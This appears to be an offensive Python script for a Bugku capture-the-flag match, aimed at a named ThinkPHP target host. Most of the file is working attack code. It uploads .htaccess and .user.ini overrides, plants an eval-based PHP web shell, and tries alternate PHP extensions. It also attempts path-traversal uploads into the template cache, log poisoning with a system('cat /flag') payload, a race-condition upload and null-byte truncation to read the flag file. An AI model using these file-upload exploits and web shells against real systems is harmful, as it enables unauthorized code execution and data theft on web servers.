#!/usr/bin/env python3
"""Team 117 快速攻击 - 上传+包含"""
import requests
import re
import time

HOST = "192-168-1-117.pvp7574.bugku.cn"
BASE = f"http://{HOST}"

def upload_file(filename, content, mime="image/jpeg"):
    files = {"file": (filename, content, mime)}
    try:
        r = requests.post(f"{BASE}/index.php?m=Home&c=Upload&a=index", files=files, timeout=8)
        m = re.search(r'(upload/\w+\.\w+)', r.text)
        return m.group(1) if m else None
    except:
        return None

def access(path):
    try:
        r = requests.get(f"{BASE}/{path}", timeout=6, allow_redirects=False)
        return r.status_code, r.text
    except:
        return 0, ""

print("[1] 基础测试")
# 1. .htaccess + AddType
ht = b"AddType application/x-httpd-php .xyz\nAddHandler application/x-httpd-php .xyz"
r1 = upload_file(".htaccess", ht)
print(f"  .htaccess: {r1}")

shell = b'<?php echo "SHELL_123";@eval($_POST["x"]);?>'
r2 = upload_file("shell.xyz", shell)
print(f"  shell.xyz: {r2}")
if r2:
    st, bd = access(r2)
    print(f"    -> {st} OK={('SHELL_123' in bd)}")
    # POST测试
    if st == 200:
        r = requests.post(f"{BASE}/{r2}", data={"x": "echo 'POST_OK';"}, timeout=6)
        print(f"    POST执行: {('POST_OK' in r.text)}")

print()
print("[2] SetHandler .htaccess")
ht2 = b"<FilesMatch \"\\.jpg$\">\nSetHandler application/x-httpd-php\n</FilesMatch>"
r3 = upload_file(".htaccess", ht2)
print(f"  .htaccess(SetHandler): {r3}")
shell_jpg = b'GIF89a<?php echo "JPG_SHELL";file_get_contents("/flag")?>'
r4 = upload_file("t.jpg", shell_jpg)
print(f"  t.jpg: {r4}")
if r4:
    st, bd = access(r4)
    print(f"    -> {st} OK={('JPG_SHELL' in bd)}")

print()
print("[3] 图片马 + 不同扩展名")
for ext in ["phtml", "phar", "php5", "php7", "php8", "inc"]:
    f = f"t.{ext}"
    r = upload_file(f, b'<?php echo "OK_'+ext.encode()+b'";?>')
    if r:
        st, bd = access(r)
        print(f"  .{ext}: {r} {st} OK={('OK_'+ext in bd)}")

print()
print("[4] .user.ini (CGI/FastCGI)")
ui = b'auto_prepend_file="t.ini.jpg"'
r5 = upload_file(".user.ini", ui)
print(f"  .user.ini: {r5}")
ui_shell = b'<?php echo "INI_SHELL";echo file_get_contents("/flag");?>'
r6 = upload_file("t.ini.jpg", ui_shell)
print(f"  t.ini.jpg: {r6}")
if r6:
    st, bd = access(r6)
    print(f"    -> {st} flag={bool(re.search(r'flag\{', bd))}")
# 直接访问首页触发.user.ini
st, bd = access("index.php")
print(f"  首页.包含: {st} flag={bool(re.search(r'flag\{', bd))} INI={('INI_SHELL' in bd)}")

print()
print("[5] ThinkPHP 模板包含 + 路径遍历上传到Cache")
print("  尝试上传到Runtime/Cache目录...")
# ThinkPHP的模板缓存会被include
tpl_content = b'<!-- {eval($_POST[c])} -->'
r7 = upload_file("../../Runtime/Cache/Home/test.php", tpl_content)
print(f"  遍历上传Cache: {r7}")
# 访问触发缓存生成
access("index.php?m=Home&c=Index&a=index&name=../../Runtime/Cache/Home/test")
# 访问Cache
st, bd = access("Runtime/Cache/Home/test.php")
print(f"  访问Cache: {st} 字节={len(bd)}")

print()
print("[6] ThinkPHP Log包含")
# 先访问带恶意内容的URL写入日志
for c in range(5):
    access(f"index.php?m=Home&c=Index&a=index&x=<?php file_get_contents('/flag'); ?>")
    access("index.php?m=Home&c=Index&a=index&y=${@system('cat /flag')}")
    time.sleep(0.1)
# 日志路径: App/Runtime/Logs/Home/YY_MM_DD.log
import datetime
today = datetime.date.today().strftime("%y_%m_%d")
log_paths = [
    f"App/Runtime/Logs/Home/{today}.log",
    f"Runtime/Logs/Home/{today}.log",
    f"../Runtime/Logs/Home/{today}.log",
]
# 通过RCE/包含访问日志
for lp in log_paths:
    print(f"  日志: {lp}")
    # 用ThinkPHP参数包含
    for c_depth in range(1, 5):
        traverse = "../" * c_depth + lp
        st, bd = access(f"index.php?m=Home&c=Show&a=index&id=1&template={traverse}")
        fl = re.search(r'flag\{[^}]+\}', bd)
        if fl:
            print(f"    ✅ 日志包含成功(c={c_depth}): {fl.group()}")
            break

print()
print("[7] 竞争条件(快速)")
import threading
shell = b'<?php echo "RACE_OK";echo file_get_contents("/flag");?>'
success = [False]
def run():
    for i in range(20):
        fname = f"rc_{os.getpid()}_{i}.php"
        up = upload_file(fname, shell)
        if up:
            st, bd = access(up)
            if "RACE_OK" in bd:
                fl = re.search(r'flag\{[^}]+\}', bd)
                print(f"  ✅ 竞争成功: {up}")
                if fl: print(f"    flag: {fl.group()}")
                success[0] = True
                return
import os
threads = [threading.Thread(target=run) for _ in range(8)]
[t.start() for t in threads]
[t.join(timeout=10) for t in threads]
if not success[0]:
    print("  竞争未成功")

print()
print("[8] 双重扩展名 + 00截断")
print("  尝试各种截断方式...")
# php 5.3.4以下的00截断
shell_content = b'<?php echo "FLAG:".file_get_contents("/flag");?>'
for suffix in ["%00.jpg", "%00.jpeg", ".php%00.jpg", ".phtml%00.txt", "\x00.jpg"]:
    fname = f"cut_{int(time.time()%10000)}{suffix}"
    r = upload_file(fname, shell_content)
    if r:
        st, bd = access(r)
        fl = re.search(r'flag\{[^}]+\}', bd)
        if fl or "FLAG:" in bd:
            print(f"  ✅ 截断{suffix[:10]}: {r} -> {fl.group() if fl else 'FLAG FOUND'}")
